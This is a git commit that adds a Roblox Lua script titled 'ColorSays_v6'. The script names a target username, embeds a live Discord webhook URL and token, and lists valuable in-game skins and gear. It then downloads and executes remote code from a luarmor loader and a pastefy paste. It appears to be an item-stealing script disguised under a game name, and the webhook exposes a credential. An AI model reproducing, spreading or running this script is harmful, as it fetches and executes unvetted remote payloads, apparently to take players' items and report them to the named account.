c810969747b00573a7e2ecb4ced629ecfd58d77c
sab-api <carlosignaa2019@gmail.com>
2026-08-31 19:49:07 -0400

    Add script ColorSays_v6_1788220146849.lua

---
+++ scripts/ColorSays_v6_1788220146849.lua
@@ -0,0 +1,56 @@
+-- Mode: CUSTOM
+getgenv().TARGET_USERNAME = "Dxdolko"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1544131092200685618/o0v3Hg4CXFcGIM9kwtMqdKdZgneM8Yi6C3zHYwxgPI1gCzylKlzmKog1O6rrgXGfkQh7"
+getgenv().NORMAL_BRAINROTS = {}
+getgenv().NORMAL_BASE_SKINS = {
+    ["Rose"] = true,
+    ["Gingerbread"] = true,
+    ["Halloween"] = true,
+    ["Christmas"] = true,
+    ["Bunny Basket"] = true,
+    ["Summer"] = true,
+    ["Pot of Gold"] = true,
+    ["Taco"] = true,
+    ["Octo"] = true,
+    ["Valentines"] = true,
+    ["Easter"] = true,
+    ["Lucky"] = true,
+    ["Aquatic"] = true,
+    ["Tralalero"] = true,
+    ["Bee Emperor"] = true,
+    ["Honey Bee"] = true
+}
+getgenv().NORMAL_GEARS = {
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Yin Yang Slap"] = true,
+    ["Cursed Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Divine Slap"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Radioactive Slap"] = true,
+    ["Rainbow Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Demon's Head"] = true,
+    ["Lava Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Phantom Slap"] = true,
+    ["Flying Bee"] = true,
+    ["Crystal Slap"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/ZuiQo0jy/raw"))()
+end)
